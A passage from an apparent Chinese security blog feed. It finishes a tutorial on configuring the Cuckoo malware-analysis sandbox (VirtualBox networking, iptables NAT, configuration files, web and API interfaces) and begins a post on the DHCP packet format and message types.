<p>注意修改前两条命令里的 <code>&lt;USERNAME&gt;</code> 和 <code>&lt;PASSWORD&gt;</code> 为自己的账户和密码</p>
</blockquote>
<h3 id="0x02-3-其他处理"><a href="#0x02-3-其他处理" class="headerlink" title="0x02.3 其他处理"></a>0x02.3 其他处理</h3><p>为了方便恶意样本分析，最大程度保证恶意样本顺利执行，还需要关闭 Windows 系统的 <strong>Windows 防火墙</strong> 和 <strong>Windows 自动更新</strong>。</p>
<p>为了方便分析多种类型的恶意软件，还应该尽量在操作系统上安装 MS-Office 套装、PDF 阅读器、常用浏览器、Java 执行环境等等。并且，为了让客户机看起来更像普通人用的正常机器而不是一台沙盒客户机，尽量给操作系统安装其他常用的办公、娱乐、聊天软件，并访问一些网站、留下一些 Cookie 或其他数据。</p>
<h3 id="0x02-4-网络配置"><a href="#0x02-4-网络配置" class="headerlink" title="0x02.4 网络配置"></a>0x02.4 网络配置</h3><p>客户机的网络配置是重中之重，配置不好 Cuckoo 几乎无法有效运行。</p>
<p>推荐的网络配置方法是通过 VirtualBox 的 <strong><code>Host-Only</code></strong> 模式，将一个或多个虚拟客户机部署在一个小的局域网中，与外界隔离开，通过 Host 机与外界交流。</p>
<p>首先，需要在 VirtualBox 上添加一块给 <code>Host-Only</code> 部署用的虚拟网卡，默认是 <code>vboxnet0</code>，Host 机通过此虚拟网卡与同网段的虚拟客户机通信：<br><img src="/imgs/1467772922722.png" alt="添加 Host-only 虚拟网络"></p>
<blockquote>
<p>VBox 中默认可能没有此 <code>vboxnet0</code> 的 <code>Host-only</code> 网卡，可以通过上图右上角的 <strong>添加</strong> 按钮手动添加</p>
</blockquote>
<p>Cuckoo 默认的 <code>Result Server</code> IP 地址为 <code>192.168.56.1</code>(在配置文件 <code>cuckoo/conf/cuckoo.conf</code> 中)，此 IP 要与上面的 <code>vboxnet0</code> 网卡的 IP 地址相对应，所以，还要手动修改 <code>vboxnet0</code> 的配置（DHCP 服务可不启用，手动配置客户机 IP 地址即可）：<br><img src="/imgs/1467773364943.png" alt="配置 vboxnet0"></p>
<p>接下来手动配置 Win7 客户机的网络：<br><img src="/imgs/1467773714198.png" alt="配置 Win7 客户机网络"></p>
<p>至此，Host 机和 Win7 客户机就可以互相通信了，互相 Ping 一下可以 Ping 通。但这还无法满足正常的自动化恶意软件分析的要求，因为这种初级的 <code>Host-only</code> 模式里面虚拟机无法访问互联网，而很多恶意软件都需要访问网络才可以正常运行。所以我们还需要 <code>vboxnet0</code> 这块网卡具有代理上网的功能，使这个小局域网里的虚拟客户机可以通过这块虚拟网卡访问互联网。如果要满足这个需求，需要在 Ubuntu Host 机上做两个操作：开启流量转发、用 <code>iptables</code> 做地址转换（NAT）规则。</p>
<p>开启 IP 转发，用下面两条命令之一皆可：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sysctl -w net.ipv4.ip_forward=1</div><div class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</div></pre></td></tr></table></figure></p>
<p>但是上面的命令只能 <strong>临时开启</strong> IP 转发功能，系统重启之后便失效。若想永久开启此功能，需要手动修改配置文件 <strong><code>/etc/sysctl.conf</code></strong> ，将里面 <code>net.ipv4.ip_forward=1</code> 前的注释取消，然后运行以下命令即可永久开启 IP 转发功能：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sysctl -p /etc/sysctl.conf</div></pre></td></tr></table></figure></p>
<p>Ubuntu 系统中用 <code>iptables</code> 设置地址转换规则，Cuckoo 官方资料给出了参考命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">iptables -A FORWARD -o eth0 -i vboxnet0 <span class="_">-s</span> 192.168.56.0/24 -m conntrack --ctstate NEW -j ACCEPT</div><div class="line">iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT</div><div class="line">iptables -A POSTROUTING -t nat -j MASQUERADE</div></pre></td></tr></table></figure></p>
<p>但是 Ubuntu 中的 <code>iptables</code> 这样设置也只是 <strong>临时</strong> 的，系统重启之后这些规则就会失效，如果想系统重启这些规则仍然可用，可以做以下处理：</p>
<p>编辑 Ubuntu 的网络配置文件 <code>/etc/network/interfaces</code> ，在文件末尾添加以下两行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">pre-up iptables-restore &lt; /etc/iptables.rules <span class="comment">#开机时启用 iptables 规则</span></div><div class="line">post-down iptables-save &gt; /etc/iptables.rules <span class="comment">#关机前保存当前所有的 iptables 规则</span></div></pre></td></tr></table></figure></p>
<p>这样一来，Ubuntu Host 主机每次关机前都会把已有的 <code>iptables</code> 规则备份到 <code>/etc/iptables.rules</code> 文件中、每次开机是都会从 <code>/etc/iptables.rules</code> 读取规则并启用。</p>
<p>配置好之后，Guest 虚拟机就可以通过 <code>vboxnet0</code> 来访问互联网了。</p>
<h3 id="0x02-5-保存客户机"><a href="#0x02-5-保存客户机" class="headerlink" title="0x02.5 保存客户机"></a>0x02.5 保存客户机</h3><p>上面算是把客户机相关的配置都配置好了，接下来需要对配置好的客户机建立一个快照。每次 Cuckoo 调用客户机分析完一个恶意样本之后，会把虚拟机恢复到这个快照的状态。</p>
<p>保存系统快照的时候有一点需要注意：确保在系统正常运行、且 <code>agent.py</code> 无界面运行的时候，执行系统快照。</p>
<hr>
<h2 id="0x03-Cuckoo-配置"><a href="#0x03-Cuckoo-配置" class="headerlink" title="0x03 Cuckoo 配置"></a>0x03 Cuckoo 配置</h2><p>准备好 Host 机系统环境、配置好客户机之后， Cuckoo 还不能正常运行，还需要配置一下 Cuckoo 才能正常运行。 Cuckoo 有好多配置文件，都在 <code>cuckoo/conf/</code> 目录下，下面简要介绍几个主要配置文件的作用：</p>
<blockquote>
<ul>
<li><strong><code>cuckoo.conf</code></strong>： 主要的配置文件，最主要的是 <code>machinery</code> 用于指定我们使用的虚拟机配置文件，默认是 <code>virtualbox</code>，该文件同样位于 <code>conf</code> 目录下，名字是 <code>virtualbox.conf</code>。另外一个比较重要的配置项是<code>[resultserver]</code> 的 <code>ip</code>和 <code>port</code>，用于指定接收分析结果的服务器。该地址必须能够让虚拟机访问到，一般设置为虚拟网卡的地址，比如前面说过的 <code>Host-only</code> 虚拟网卡 <code>vboxnet0</code> 的 IP 地址<code>192.168.56.1</code>（也可以自己改成其他的），端口默认即可；</li>
<li><strong><code>auxiliary.conf</code></strong>： 辅助组件配置模块，可以配置 <code>tcpdump</code> /<code>mitm</code>/<code>sniffer</code>等；</li>
<li><strong><code>memory.conf</code></strong>： 内存分析配置模块，主要用来配置 <code>Volatility</code> 的行为；</li>
<li><strong><code>processing.conf</code></strong>： 核心处理组件配置文件，可以开启/关闭行为分析、缓冲区分析、内存分析、截屏、Snort、字符串提取、<code>VirusTotal</code>辅助分析等等功能；</li>
<li><strong><code>&lt;machinery&gt;.conf</code></strong>： 虚拟化配置文件，包括 <code>virtualbox</code>/<code>vmware</code>/<code>kvm</code>/<code>qume</code>等。在实际的配置当中，根据自己试用的虚拟化环境，只需要配置其中一个即可，同时采用的这个配置文件也必须 在<code>cuckoo.conf</code> 的 <code>machinery</code> 字段指定。这里的配置选项都是针对特定虚拟化平台的，很多选项只适用于某些平台。前面我们用的是 <code>virtualbox.conf</code>，其中 <code>mode</code> 指定 <code>virtualbox</code> 的运行模式，<code>path</code> 指定 <code>VBoxManage</code> 的绝对路径，<code>machines</code>指定我们使用的虚拟机的名字（多个虚拟机需要用半角逗号隔开），<code>platform</code> 指定虚拟客户机的系统类型，<code>ip</code> 指定虚拟机的 <code>ip</code> 地址;</li>
<li><strong><code>reporting.conf</code></strong>： 报告生成模块的配置文件，用来开启 <code>jsondump</code> 或者 <code>HTML Report</code>，还可以配置 <code>MongoDB</code> 存储分析结果（Web 控制台会用到）。</li>
</ul>
</blockquote>
<p>这里，我们需要修改的配置文件，可以修改 <strong><code>processing.conf</code></strong> 启用/关闭 自己想要的模块（比如 VT 模块），还需要修改 <strong><code>virtualbox.conf</code></strong>。根绝前文所述，假设我的 Win7 客户机名称是 <strong><code>jiayu1</code></strong>，IP 地址是 <code>192.168.56.101</code>，<strong><code>virtualbox.conf</code></strong> 的内容示例如下（<code>mode = headless</code> 是指 VBox 的 <strong>无界面启动模式</strong>）：<br><figure class="highlight roboconf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">[virtualbox]</div><div class="line"><span class="comment"># Specify which VirtualBox mode you want to run your machines on.</span></div><div class="line"><span class="comment"># Can be "gui", "sdl" or "headless". Refer to VirtualBox's official</span></div><div class="line"><span class="comment"># documentation to understand the differences.</span></div><div class="line">mode = headless</div><div class="line"></div><div class="line"><span class="comment"># Path to the local installation of the VBoxManage utility.</span></div><div class="line">path = /usr/bin/vboxmanage</div><div class="line"></div><div class="line"><span class="comment"># Default network interface.</span></div><div class="line">interface = vboxnet0</div><div class="line"></div><div class="line"><span class="comment"># Specify a comma-separated list of available machines to be used. For each</span></div><div class="line"><span class="comment"># specified ID you have to define a dedicated section containing the details</span></div><div class="line"><span class="comment"># on the respective machine. (E.g. cuckoo1,cuckoo2,cuckoo3)</span></div><div class="line">machines = jiayu1</div><div class="line"></div><div class="line">[jiayu1]</div><div class="line"><span class="comment"># Specify the label name of the current machine as specified in your</span></div><div class="line"><span class="comment"># VirtualBox configuration.</span></div><div class="line">label = jiayu1</div><div class="line"></div><div class="line"><span class="comment"># Specify the operating system platform used by current machine</span></div><div class="line"><span class="comment"># [windows/darwin/linux].</span></div><div class="line">platform = windows</div><div class="line"></div><div class="line"><span class="comment"># Specify the IP address of the current virtual machine. Make sure that the</span></div><div class="line"><span class="comment"># IP address is valid and that the host machine is able to reach it. If not,</span></div><div class="line"><span class="comment"># the analysis will fail.</span></div><div class="line">ip = 192.168.56.101</div><div class="line"></div><div class="line">[honeyd]</div><div class="line"><span class="comment"># For more information on this VM please refer to the "services" section of</span></div><div class="line"><span class="comment"># the conf/auxiliary.conf configuration file. This machine is a bit special</span></div><div class="line"><span class="comment"># in the way that its used as an additional VM for an analysis.</span></div><div class="line"><span class="comment"># *NOTE* that if this functionality is used, the VM should be registered in</span></div><div class="line"><span class="comment"># the "machines" list in the beginning of this file.</span></div><div class="line">label = honeyd</div><div class="line">platform = linux</div><div class="line">ip = 192.168.56.102</div><div class="line">tags = service, honeyd</div><div class="line">options = nictrace noagent</div></pre></td></tr></table></figure></p>
<hr>
<h2 id="0x04-启动-Cuckoo，上传样本执行自动化分析"><a href="#0x04-启动-Cuckoo，上传样本执行自动化分析" class="headerlink" title="0x04 启动 Cuckoo，上传样本执行自动化分析"></a>0x04 启动 Cuckoo，上传样本执行自动化分析</h2><p>至此，Cuckoo 自动化恶意软件分析环境的配置工作算是基本完成，接下来就是启动 Cuckoo 服务、上传样本进行自动化分析了。</p>
<p>在启动 Cuckoo 服务之前，还需要开启 <code>MongoDB</code> 服务，并根据 <strong><code>reporting.conf</code></strong> 中的关于 <code>MongoDB</code> 的配置创建一个新的数据集。比如我的 <strong><code>reporting.conf</code></strong> 关于数据库的 配置如下所示，我就需要手动创建一个名为 <code>cuckoo</code> 的数据集：<br><figure class="highlight roboconf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[mongodb]</div><div class="line">enabled = yes </div><div class="line">host = 127.0.0.1</div><div class="line">port = 27017</div><div class="line">db = cuckoo</div><div class="line">store_memdump = yes </div><div class="line">paginate = 100</div></pre></td></tr></table></figure></p>
<p>启动 Cuckoo 的服务只需一条命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python cuckoo.py</div></pre></td></tr></table></figure></p>
<p>但这样只能让该服务进程前台运行并且不能关闭中断，如果想让它后台运行，可以这样启动：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nohup python cuckoo.py &amp;</div></pre></td></tr></table></figure></p>
<p>启动 Cuckoo 服务进程之后，就可以提交样本进行分析了。提交样本可以用 <code>cuckoo/utils/submit.py</code> 来提交，具体方法见帮助：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">usage: submit.py [-h] [<span class="_">-d</span>] [--remote REMOTE] [--url] [--package PACKAGE]</div><div class="line">                 [--custom CUSTOM] [--owner OWNER] [--timeout TIMEOUT]</div><div class="line">                 [-o OPTIONS] [--priority PRIORITY] [--machine MACHINE]</div><div class="line">                 [--platform PLATFORM] [--memory] [--enforce-timeout]</div><div class="line">                 [--clock CLOCK] [--tags TAGS] [--baseline] [--max MAX]</div><div class="line">                 [--pattern PATTERN] [--shuffle] [--unique] [--quiet]</div><div class="line">                 [target]</div><div class="line"></div><div class="line">positional arguments:</div><div class="line">  target                URL, path to the file or folder to analyze</div><div class="line"></div><div class="line">optional arguments:</div><div class="line">  -h, --help            show this <span class="built_in">help</span> message and <span class="built_in">exit</span></div><div class="line">  <span class="_">-d</span>, --debug           Enable debug logging</div><div class="line">  --remote REMOTE       Specify IP:port to a Cuckoo API server to submit</div><div class="line">                        remotely</div><div class="line">  --url                 Specify whether the target is an URL</div><div class="line">  --package PACKAGE     Specify an analysis package</div><div class="line">  --custom CUSTOM       Specify any custom value</div><div class="line">  --owner OWNER         Specify the task owner</div><div class="line">  --timeout TIMEOUT     Specify an analysis timeout</div><div class="line">  -o OPTIONS, --options OPTIONS</div><div class="line">                        Specify options <span class="keyword">for</span> the analysis package (e.g.</div><div class="line">                        <span class="string">"name=value,name2=value2"</span>)</div><div class="line">  --priority PRIORITY   Specify a priority <span class="keyword">for</span> the analysis represented by an</div><div class="line">                        <span class="built_in">integer</span></div><div class="line">  --machine MACHINE     Specify the identifier of a machine you want to use</div><div class="line">  --platform PLATFORM   Specify the operating system platform you want to use</div><div class="line">                        (windows/darwin/linux)</div><div class="line">  --memory              Enable to take a memory dump of the analysis machine</div><div class="line">  --enforce-timeout     Enable to force the analysis to run <span class="keyword">for</span> the full</div><div class="line">                        timeout period</div><div class="line">  --clock CLOCK         Set virtual machine clock</div><div class="line">  --tags TAGS           Specify tags identifier of a machine you want to use</div><div class="line">  --baseline            Run a baseline analysis</div><div class="line">  --max MAX             Maximum samples to add <span class="keyword">in</span> a row</div><div class="line">  --pattern PATTERN     Pattern of files to submit</div><div class="line">  --shuffle             Shuffle samples before submitting them</div><div class="line">  --unique              Only submit new samples, ignore duplicates</div><div class="line">  --quiet               Only <span class="built_in">print</span> text on failure</div></pre></td></tr></table></figure></p>
<p>但这种命令提交的方法体验不太好，Cuckoo 官方提供了一个基于 Django 的 Web 管理界面，在 <code>cuckoo/web/</code> 目录中，启动这个 Web 管理界面需要进入 <code>cucoo/web/</code> 目录，然后运行以下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python manage.py runserver</div></pre></td></tr></table></figure></p>
<p>如果需要对外开放该 Web 界面，则需要指定监听的 IP 地址 和端口：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python manage.py runserver 0.0.0.0:[PORT]</div></pre></td></tr></table></figure></p>
<p>然后就可以通过浏览器访问 Ubuntu Host 机的 IP 地址和 Cuckoo Web 界面对应的端口了，界面如下所示：<br><img src="/imgs/1467798366595.png" alt="Web管理系统"></p>
<p>点击导航栏上的 <code>Submit</code> 按钮，即可跳转到样本上传页面，上传时还可以选择一些高级的选项：<br><img src="/imgs/1467798476312.png" alt="上传样本"></p>
<blockquote>
<p>可以看到，Cuckoo 不仅可以直接分析上传的样本文件，还可以分析远程的 URL</p>
</blockquote>
<p>上传完成后，Cuckoo 就会自动分析，分析完成后，可以在 <code>Recent</code> 页面里查看最近分析的样本以及结果：<br><img src="/imgs/1467798638548.png" alt="Recent 列表"></p>
<p>Cuckoo 分析完的样本，可以点击查看分析报告，也可以重新分析已经完成的分析任务：<br><img src="/imgs/1467799019861.png" alt="查看分析结果"></p>
<hr>
<h2 id="0x05-其他"><a href="#0x05-其他" class="headerlink" title="0x05 其他"></a>0x05 其他</h2><p><code>cuckoo/cukoo.py</code> 启动时有一个特殊的参数选项 <code>--clean</code>，官方的解释为 <code>Remove all tasks and samples and their associated data</code>。即一旦运行<code>python cuckoo.py --clean</code> ，那么所有的分析任务、样本和分析结果相关的数据都会被清除，相当于对 Cuckoo <strong>恢复出厂设置</strong>。</p>
<p>Cuckoo 自带了一个基于 <strong><code>flask</code></strong> 的轻量级 REST API 服务程序，即 <code>cuckoo/utils/api.py</code>，默认启动此程序会绑定到 <strong>localhost:8090</strong>，也可以启动时指定监听地址和端口：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python utils/api.py --host 0.0.0.0 --port 1337</div></pre></td></tr></table></figure></p>
<blockquote>
<p>也可以用此 API 程序，通过 <strong><code>uWSGI</code></strong> 和 <strong><code>Nginx</code></strong> 代理部署一个高性能的 REST API 服务。</p>
</blockquote>
<p>通过这个 REST API，可以实现灵活的任务管理（甚至比前文提到的 Cuckoo 自带的 Web 管理界面还灵活） ，也可以基于此开发一套自己的 Cuckoo 管理程序。具体用法参考 Cuckoo 官方文档。</p>
<p>Cuckoo 还支持分布式部署，多 Host 机节点、多 Guest 机支持，部署方式详见 官方文档。</p>
<p>Cuckoo 部署完成后，通过自带的 Web 管理界面，如果某个样本完成分析但查看分析报告的时候出现如下模板渲染错误：<br><img src="/imgs/1467860877539.png" alt="模板渲染错误"></p>
<p>处理方式是修改 <code>web/analysis/urls.py</code> 文件：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">-    <span class="string">"/(?P&lt;ip&gt;[\d\.]+)?/(?P&lt;host&gt;[a-zA-Z0-9-\.]+)?"</span></div><div class="line">+    <span class="string">"/(?P&lt;ip&gt;[\d\.]+)?/(?P&lt;host&gt;[a-zA-Z0-9-_\.]+)?"</span></div></pre></td></tr></table></figure></p>
<p>最后，Cuckoo 官方虽然声称可以支持 Linux 样本的分析，但支持的并不好。在 Ubuntu 上安装 <code>Systemtap</code> 并用 <code>stap</code> 命令执行 <code>cuckoo/data/strace.stp</code> 脚本完美生成可用的 <code>stap_xxxx.ko</code>，还要搞定官方并没有提供的 <code>probelkm.ko</code>，会经历各种大坑小坑，足够另起一篇长文，此处不详述。</p>
<hr>
<h2 id="0x06-参考资料"><a href="#0x06-参考资料" class="headerlink" title="0x06 参考资料"></a>0x06 参考资料</h2><ol>
<li><a href="http://docs.cuckoosandbox.org/en/latest/" target="_blank" rel="external">http://docs.cuckoosandbox.org/en/latest/</a></li>
<li><a href="http://drops.wooyun.org/tips/11367" target="_blank" rel="external">http://drops.wooyun.org/tips/11367</a></li>
<li><a href="http://easwy.com/blog/archives/enable-ip-forward-on-linux/" target="_blank" rel="external">http://easwy.com/blog/archives/enable-ip-forward-on-linux/</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-简述&quot;&gt;&lt;a href=&quot;#0x00-简述&quot; class=&quot;headerlink&quot; title=&quot;0x00 简述&quot;&gt;&lt;/a&gt;0x00 简述&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;沙盒&lt;/strong&gt;(&lt;strong&gt;Sanbox&lt;/strong&gt;) 是一种将未知、不可信的软件隔离执行的安全机制。恶意软件分析沙盒一般用来将不可信软件放在隔离环境中自动地动态执行，然后提取其运行过程中的进程行为、网络行为、文件行为等动态行为，安全研究员可以根据这些行为分析结果对恶意软件进行更深入地分析。&lt;/p&gt;
&lt;p&gt;Cuckoo 是一款用 &lt;strong&gt;Python&lt;/strong&gt; 编写的开源的自动化恶意软件分析系统，它的主要功能有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;跟踪记录恶意软件所有的调用状况；&lt;/li&gt;
&lt;li&gt;恶意软件文件行为：恶意软件执行过程中创建新文件、修改文件、删除文件、读取文件或下载文件的行为；&lt;/li&gt;
&lt;li&gt;获取恶意软件的内存镜像；&lt;/li&gt;
&lt;li&gt;以 PCAP 格式记录恶意软件的网络流量；&lt;/li&gt;
&lt;li&gt;获取恶意软件执行过程中的屏幕截图；&lt;/li&gt;
&lt;li&gt;获取执行恶意软件的客户机的完整内存镜像&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="security" scheme="http://jiayu0x.com/categories/security/"/>
    
    
      <category term="security" scheme="http://jiayu0x.com/tags/security/"/>
    
      <category term="cuckoo" scheme="http://jiayu0x.com/tags/cuckoo/"/>
    
      <category term="malwr" scheme="http://jiayu0x.com/tags/malwr/"/>
    
      <category term="sandbox" scheme="http://jiayu0x.com/tags/sandbox/"/>
    
  </entry>
  
  <entry>
    <title>DHCP 协议原理与攻防简介</title>
    <link href="http://jiayu0x.com/2015/03/22/DHCP-protocol-and-offensive-and-defensive/"/>
    <id>http://jiayu0x.com/2015/03/22/DHCP-protocol-and-offensive-and-defensive/</id>
    <published>2015-03-21T16:00:00.000Z</published>
    <updated>2017-04-04T10:46:46.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-协议原理"><a href="#1-协议原理" class="headerlink" title="1. 协议原理"></a>1. 协议原理</h2><h3 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h3><p>DHCP( Dynamic Host Configuration Protocol, 动态主机配置协议)，是一个局域网的网络协议，使用 UDP 协议工作， 主要有两个用途：给内部网络或网络服务供应商自动分配 IP 地址，给用户或者内部网络管理员作为对所有计算机作中央管理的手段，在 RFC 2131 中有详细的描述。DHCP 有3个端口，其中 UDP67 和 UDP68 为正常的 DHCP 服务端口，分别作为 DHCP Server 和 DHCP Client 的服务端口；546 号端口用于 DHCPv6 Client ，而不用于 DHCPv4，是为 DHCP Failover 服务，这是需要特别开启的服务，DHCP Failover 是用来做“双机热备”的。</p>
<p>在 IP 网络中，每个连接 Internet 的设备都需要分配唯一的 IP 地址。DHCP 使网络管理员能从中心结点监控和分配 IP 地址。当某台计算机移到网络中的其它位置时，能自动收到新的 IP 地址，而不用在每台计算机上单独配置固定的 IP 地址。</p>
<a id="more"></a>
<p>DHCP 使用了 <strong>租约</strong> 的概念，或称为计算机 <strong>IP 地址的有效期</strong>。租用时间是不定的，主要取决于用户在某地联接 Internet 需要多久，这对于教育行业和其它用户频繁改变的环境是很实用的。通过较短的租期，DHCP 能够在一个计算机比可用 IP 地址多的环境中动态地重新配置网络。DHCP 支持为计算机分配静态地址，如需要永久性 IP 地址的 Web 服务器。</p>
<p>DHCP 和另一个网络 IP 管理协议 <code>BOOTP</code> 类似(<code>BOOTP</code> 是 DHCP 的前身)。目前两种配置管理协议都得到了普遍使用，其中 DHCP 更为先进。某些操作系统，如 Windows NT/2000，都带有 DHCP 服务器。DHCP 或 BOOTP 客户端是装在计算机中的一个程序，这样就可以对其进行配置操作。</p>
<h3 id="1-2-详解"><a href="#1-2-详解" class="headerlink" title="1.2 详解"></a>1.2 详解</h3><h4 id="1-2-1-报文格式"><a href="#1-2-1-报文格式" class="headerlink" title="1.2.1 报文格式"></a>1.2.1 报文格式</h4><p><img src="/imgs/1425885447242.png" alt="DHCP 报文格式"></p>
<p>各字段解释如下：</p>
<table>
<thead>
<tr>
<th style="text-align:left">字段</th>
<th style="text-align:left">长度(byte)</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">op</td>
<td style="text-align:left">1</td>
<td style="text-align:left">报文类型，<code>1</code>表示请求报文，<code>2</code>表示响应报文</td>
</tr>
<tr>
<td style="text-align:left">htype</td>
<td style="text-align:left">1</td>
<td style="text-align:left">硬件地址类型，<code>1</code> 表示 10Mb/s 以太网 地址</td>
</tr>
<tr>
<td style="text-align:left">hlen</td>
<td style="text-align:left">1</td>
<td style="text-align:left">硬件地址长度，以太网中该值为 `6</td>
</tr>
<tr>
<td style="text-align:left">hops</td>
<td style="text-align:left">1</td>
<td style="text-align:left">跳数。客户端设置为 <code>0</code>，也能被一个 DHCP 代理服务器设置</td>
</tr>
<tr>
<td style="text-align:left">xid</td>
<td style="text-align:left">4</td>
<td style="text-align:left">事务ID，由客户端选择的一个随机数，被服务器和客户端用来在它们之间交流请求和响应，客户端用它对请求和应答进行匹配。该ID由客户端设置并由服务器返回，为 32 位整数</td>
</tr>
<tr>
<td style="text-align:left">secs</td>
<td style="text-align:left">2</td>
<td style="text-align:left">由客户端填充，表示从客户端开始获得 IP 地址或 IP 地址续借后所使用了的秒数</td>
</tr>
<tr>
<td style="text-align:left">flags</td>
<td style="text-align:left">2</td>
<td style="text-align:left">标志字段。这个 16 比特的字段，目前只有最左边的一个比特有用，该位为 <code>0</code> ，表示单播，为 <code>1</code> 表示广播</td>
</tr>
<tr>
<td style="text-align:left">ciaddr</td>
<td style="text-align:left">4</td>
<td style="text-align:left">客户端 IP，只有客户端处于 <code>Bound</code>、<code>Renew</code>、<code>Rebinding</code> 状态，并且能响应 ARP 请求时，才能被填充</td>
</tr>
<tr>
<td style="text-align:left">yiaddr</td>
<td style="text-align:left">4</td>
<td style="text-align:left">“你自己的” 或客户端的 IP 地址</td>
</tr>
<tr>
<td style="text-align:left">siaddr</td>
<td style="text-align:left">4</td>
<td style="text-align:left">DHCP 协议流程的下一个阶段要使用的服务器的IP地址，由服务端在 <code>DHCPOFFER</code> 和 <code>DHCPACK</code> 报文中返回</td>
</tr>
<tr>
<td style="text-align:left">giaddr</td>
<td style="text-align:left">4</td>
<td style="text-align:left">DHCP 中继器的 IP 地址</td>
</tr>
<tr>
<td style="text-align:left">chaddr</td>
<td style="text-align:left">16</td>
<td style="text-align:left">客户端硬件地址，客户端必须设置它的 <code>chaddr</code> 字段。UDP 数据包中的以太网帧首部也有该字段，但通常通过查看 UDP 数据包来确定以太网帧首部中的该字段获取该值比较困难或者说不可能，而在 UDP 协议承载的 DHCP 报文中设置该字段，用户进程就可以很容易地获取该值</td>
</tr>
<tr>
<td style="text-align:left">sname</td>
<td style="text-align:left">64</td>
<td style="text-align:left">可选的服务器主机名，该字段是空结尾的字符串，由服务器填写</td>
</tr>
<tr>
<td style="text-align:left">file</td>
<td style="text-align:left">128</td>
<td style="text-align:left">启动文件名，是一个空结尾的字符串。DHCP <code>Discover</code> 报文中是 <code>generic</code> 名字或空字符，DHCP <code>OFFER</code> 报文中提供有效的目录路径全名</td>
</tr>
<tr>
<td style="text-align:left">options</td>
<td style="text-align:left">可选</td>
<td style="text-align:left">可选参数域，格式为 <code>代码+长度+数据</code></td>
</tr>
</tbody>
</table>
<p>关于 <code>options</code> 字段的具体说明，可以参考： <a href="http://tools.ietf.org/html/rfc2132" target="_blank" rel="external">http://tools.ietf.org/html/rfc2132</a></p>
<h4 id="1-2-2-报文类型"><a href="#1-2-2-报文类型" class="headerlink" title="1.2.2 报文类型"></a>1.2.2 报文类型</h4><p>DHCP 报文共有 <strong><code>8</code></strong> 种，分别用于不同的功能，详解如下：</p>
<table>
<thead>
<tr>
<th style="text-align:left">报文类型</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">DHCPDISCOVER</td>
<td style="text-align:left">DHCP 客户端请求地址时，并不知道 DHCP 服务器的位置，因此 DHCP 客户端会在本地网络内以广播方式发送请求报文，这个报文成为 Discover 报文，目的是发现网络中的 DHCP 服务器，所有收到 Discover 报文的 DHCP 服务器都会发送回应报文，DHCP 客户端据此可以知道网络中存在的 DHCP 服务器的位置。</td>
</tr>
<tr>
<td style="text-align:left">DHCPOFFER</td>
